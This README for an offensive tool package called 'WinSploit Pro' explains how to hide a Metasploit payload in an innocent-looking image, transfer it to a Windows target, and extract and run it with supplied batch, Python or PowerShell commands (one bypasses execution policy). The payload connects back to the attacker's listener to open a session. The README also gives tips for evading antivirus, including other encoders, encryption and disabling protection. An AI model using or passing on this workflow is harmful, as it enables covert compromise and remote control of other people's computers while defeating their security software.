# Windows Extraction Package

## IMPORTANT: How to Use Steganographic Payloads

### The Problem:
When you hide a payload in an image, the payload is EMBEDDED inside the image.
Simply transferring the image to Windows does NOT execute the payload!

### The Solution:
You must EXTRACT the payload on the target Windows system first.

## Files Included:
- windows_extractor.py - Python extraction script (requires Python + libraries)
- extract_and_run.bat - Windows batch file (easier to use)
- Extract-Payload.ps1 - PowerShell script (alternative method)

## Step-by-Step Instructions:

### 1. On your Kali/Linux (attacker machine):
- Generate and hide payload in image using WinSploit Pro
- Start Metasploit listener (IMPORTANT: Do this BEFORE extraction!)
- Note the LHOST and LPORT values

### 2. Transfer to Windows target:
- Transfer your steganographic image (e.g., vacation_photo.png)
- Transfer this entire extraction package folder

### 3. On Windows target, run ONE of these methods:

#### Method A - Batch File (Easiest):
```
extract_and_run.bat your_image.png
```
Or with password:
```
extract_and_run.bat your_image.png yourpassword
```

#### Method B - Python (if Python installed):
```
python windows_extractor.py your_image.png
```
Or with password:
```
python windows_extractor.py your_image.png yourpassword
```

#### Method C - PowerShell:
```
PowerShell -ExecutionPolicy Bypass -File Extract-Payload.ps1 -ImagePath your_image.png
```
Or with password:
```
PowerShell -ExecutionPolicy Bypass -File Extract-Payload.ps1 -ImagePath your_image.png -Password yourpassword
```

### 4. Check your listener:
After successful extraction and execution, you should see a session in Metasploit!

## Troubleshooting:

### No session in Metasploit?
- Make sure listener was started BEFORE extraction
- Check LHOST/LPORT match between payload generation and listener
- Verify Windows Firewall isn't blocking the connection
- Ensure network connectivity between target and attacker

### Python not found on Windows?
- Use the batch file method instead
- Or install Python on the target system

### Antivirus blocking?
- Try different payload encoders
- Use encryption when hiding the payload
- Consider disabling antivirus temporarily for testing

## Example Complete Workflow:

1. On Kali: Generate payload + hide in vacation_photo.png with password "family123"
2. On Kali: Start listener with same LHOST/LPORT
3. Transfer vacation_photo.png and this folder to Windows PC
4. On Windows: Run "extract_and_run.bat vacation_photo.png family123"
5. Check Kali listener for new session!

Remember: The steganographic image is just a CONTAINER for the payload.
You must extract and execute the payload to get a connection!
